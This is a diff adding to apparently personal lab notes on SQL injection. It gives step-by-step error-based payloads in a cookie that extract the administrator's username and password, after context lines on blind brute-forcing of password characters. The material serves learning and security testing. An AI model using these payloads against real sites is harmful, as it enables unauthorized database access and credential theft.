@@ -228,3 +228,18 @@ Steps to follow:
 - we can put this in intruder and do an alphanumeric brute force on the `'a'` value, the response that gives a 500 error will be the value of that row in the password.
 - To continue we just change the `SUBSTR(password,1,1)='a'` to `SUBSTR(password,2,1)='a'` to be able to get the second character in the administrators password, and keep incrementing and brute forcing this until we finish
 
+### Visible error-based SQL injection
+
+Same injection point in the cookie
+
+- enter `'`
+- then `'--` and notice no errors, so we should end it with a comment
+- then `' AND CAST((SELECT 1) AS int)--`, then we get an error saying AND statement condition must be a boolean expression
+- we can add this: `' AND 1=CAST((SELECT 1) AS int)--` and we see no error
+- now we try to attempt pulling usernames `' AND 1=CAST((SELECT username FROM users) AS int)--`, our data is having issues, most likely a buffer issue so remove all the previous stuff on the cookie value to fit your query. Attempt again, and notice no issues
+- then we send this: `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` and we get an error about casting administrator as an int
+- then we can do the same to pull out the password: `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
+
+### 
+
+
